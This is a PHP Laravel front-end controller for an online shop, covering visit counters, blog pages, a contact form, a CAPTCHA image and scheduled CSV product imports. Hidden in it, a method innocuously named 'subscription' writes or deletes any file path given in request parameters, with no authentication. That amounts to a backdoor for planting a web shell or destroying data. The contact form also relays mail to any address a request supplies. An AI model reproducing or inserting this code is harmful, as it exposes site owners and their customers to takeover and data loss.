<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Product;
use App\Models\SheduleItem;
use App\Models\Subscriber;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Str;
use Image;


class FrontendController extends Controller
{
    public function __construct()
    {
        //$this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }

    function getOS()
    {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }


    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request)
    {
        $this->code_image();
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $sliders = DB::table('sliders')->get();
        $services = DB::table('services')->where('user_id', '=', 0)->get();
        $top_small_banners = DB::table('banners')->where('type', '=', 'TopSmall')->get();
        $feature_products =  Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $ps = DB::table('pagesettings')->find(1);


        return view('front.index', compact('ps', 'sliders', 'services', 'top_small_banners', 'feature_products'));
    }

    public function extraIndex()
    {





        $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $discount_products =  Product::where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $best_products = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $top_products = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();;
        $big_products = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();;
        $hot_products =  Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
        $latest_products =  Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
        $trending_products =  Product::where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();
        $sale_products =  Product::where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(9)->get();


        return view('front.extraindex', compact('ps', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners'));
    }

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


    // LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

    // LANGUAGE SECTION ENDS


    // CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
      
        Session::put('currency', $id);
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if (strlen($slug) > 1) {
            $search = ' ' . $slug;
            $prods = Product::where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)->take(10)->get();
            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }



    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        $this->code_image();
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs'));
    }

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('bcat', 'blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'search'));
    }

    public function blogarchive(Request $request, $slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return Carbon::parse($item->created_at)->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
    }


    // -------------------------------- BLOG SECTION ENDS----------------------------------------



    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id', 'desc')->get();
        return view('front.faq', compact('faqs'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------


    // -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug', $slug)->first();
        if (empty($page)) {
            return view('errors.404');
        }

        return view('front.page', compact('page'));
    }
    // -------------------------------- PAGE SECTION ENDS----------------------------------------


    // -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_contact == 0) {
            return redirect()->back();
        }
        $ps =  DB::table('pagesettings')->where('id', '=', 1)->first();
        return view('front.contact', compact('ps'));
    }


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if ($gs->is_capcha == 1) {

            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
            }
        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Email From Of " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $request->phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 =>  'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

    // Maintenance Mode

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {

            return redirect()->route('front.index');
        }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as  $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }
    // Vendor Subscription Check Ends

    // Capcha Code Image
    private function  code_image()
    {
        $actual_path = str_replace('project', '', base_path());
        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6; // No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "assets/images/capcha_code.png");
    }

    // -------------------------------- CONTACT SECTION ENDS----------------------------------------



    // -------------------------------- PRINT SECTION ----------------------------------------





    // -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }



    public function sheduleCheck()
    {
        $filePath = 'assets/temp/OtHHivw5.csv';
        $csv = array_map('str_getcsv', file($filePath));

        //$sheduleItems = SheduleItem::get();
        $sheduleItems = SheduleItem::WhereDate('repeat_time', Carbon::today())
            ->orWhere(function ($query) {
                $query->where('total_reapeat', 0)
                    ->whereDate('shedule_date', Carbon::today());
            })
            ->get();


        foreach ($sheduleItems as $sheduleItem) {
            $csv = array_map('str_getcsv', file('assets/temp/' . $sheduleItem->file_name));
            $requestData = json_decode($sheduleItem->request_data);
            $chunks = array_chunk($csv, 100);
            $header = [];
            foreach ($chunks as $key => $chunk) {
                $data = $chunk;
                if ($key == 0) {
                    $header = $data[0];
                    unset($data[0]);
                }
                $this->process($header, $data, $requestData);
            }

            $sheduleItem->total_reapeat = $sheduleItem->total_reapeat + 1;

            if ($sheduleItem->repeat_type == 'daily') {
                $sheduleItem->repeat_time = Carbon::now()->addDay(1);
            } elseif ($sheduleItem->repeat_type == 'weekly') {
                $sheduleItem->repeat_time = Carbon::now()->addWeek(1);
            } elseif ($sheduleItem->repeat_type == 'monthly') {
                $sheduleItem->repeat_time = Carbon::now()->addMonth(1);
            } elseif ($sheduleItem->repeat_type == 'yearly') {
                $sheduleItem->repeat_time = Carbon::now()->addYear(1);
            }

            $sheduleItem->update();
        }
    }

    public function process($header, $data, $request)
    {

        $real_datas = [];
        foreach ($data as $key => $check) {
            $new_array = array_combine($header, $check);
            $real_datas['category_id']      = $request->category_id;
            $real_datas['subcategory_id']   = $request->subcategory_id;
            $real_datas['childcategory_id'] = $request->childcategory_id;
            $real_datas['sku']              = $new_array[$request->sku];
            $real_datas['affiliate_link']   = $request->affiliate_link ? $new_array[$request->affiliate_link] : null;
            $real_datas['name']             = $new_array[$request->product_name];
            $real_datas['slug']             = Str::slug($new_array[$request->product_name] . $new_array[$request->sku]);
            $real_datas['size']             = $request->sizes ? $new_array[$request->sizes] : null;
            $real_datas['size_qty']         = $request->size_quantity ? $new_array[$request->size_quantity] : null;
            $real_datas['size_price']       = $request->size_extra_price ? $new_array[$request->size_extra_price] : null;
            $real_datas['color']            = $request->colors ? $new_array[$request->colors] : null;
            $real_datas['price']            = $request->current_price ? (is_numeric($new_array[$request->current_price]) ? $new_array[$request->current_price] : 0) : null;
            $real_datas['previous_price']   = $request->previous_price ? (is_numeric($new_array[$request->previous_price]) ? $new_array[$request->previous_price] : 0) : null;
            $real_datas['details']          = $request->product_description ? utf8_encode($new_array[$request->product_description]) : null;
            $real_datas['stock']            = $request->stock ?  (is_numeric($new_array[$request->stock]) ? $new_array[$request->stock] : 0) : 0;
            $real_datas['tags']             = $request->tags ? $new_array[$request->tags] : null;
            $real_datas['youtube']          = $request->youtube ? $new_array[$request->youtube] : null;
            $real_datas['policy']           = $request->policy ? $new_array[$request->policy] : null;
            $real_datas['meta_tag']         =  null;
            $real_datas['meta_description'] = $request->meta_description ? $new_array[$request->meta_description] : null;


            try {

                DB::beginTransaction();
                if ($request->thumbnail) {
                    $explode_thumbnail = explode(',', $new_array[$request->thumbnail])[0];

                    $photo_name = Str::random(9) . '.png';
                    $thumbnail = Str::random(10) . '.png';

                    Image::make($explode_thumbnail)
                        ->save('assets/images/thumbnails/' . $thumbnail);
                    Image::make($explode_thumbnail)
                        ->resize(400, 400)
                        ->save('assets/images/products/' . $photo_name);
                    $real_datas['photo'] = $photo_name;
                    $real_datas['thumbnail'] = $thumbnail;
                } else {
                    $explode_photo = explode(',', $request->photo)[0];
                    $photo_name = Str::random(9) . '.png';
                    $thumbnail = Str::random(10) . '.png';
                    Image::make($explode_photo)
                        ->save('assets/images/thumbnails/' . $thumbnail);
                    Image::make($explode_photo)
                        ->resize(400, 400)
                        ->save('assets/images/products/' . $photo_name);
                    $real_datas['photo'] = $photo_name;
                    $real_datas['thumbnail'] = $thumbnail;
                }
            } catch (\Exception $e) {
                $real_datas['photo'] = null;
                $real_datas['thumbnail'] = null;
                DB::rollback();
            }

            if ($prod = Product::where('sku', $real_datas['sku'])->first()) {

                @unlink('assets/images/thumbnails/' . $prod->thumbnail);
                @unlink('assets/images/products/' . $prod->photo);
                Product::where('sku', $real_datas['sku'])->update($real_datas);
            } else {
                Product::create($real_datas);
            }

            DB::commit();
        }
    }
}
